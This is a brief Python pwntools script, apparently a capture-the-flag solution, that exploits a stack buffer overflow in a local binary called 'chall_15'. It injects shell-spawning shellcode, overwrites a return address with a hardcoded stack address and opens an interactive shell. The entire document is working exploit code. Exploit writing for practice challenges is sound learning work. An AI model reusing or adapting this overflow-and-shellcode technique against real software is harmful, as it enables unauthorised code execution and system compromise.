from pwn import *
shellcode = asm(shellcraft.sh())
payload = b"A"*10 + p32(0xfacade) + shellcode + b"\x00"*19 + p32(0xfacade)*4
p = process("./chall_15")
p.sendline(b"JUNK")
p.recv()
leak = 0x7ffc4de5039a
payload += p64(leak+14)
p.sendline(payload)
p.interactive()
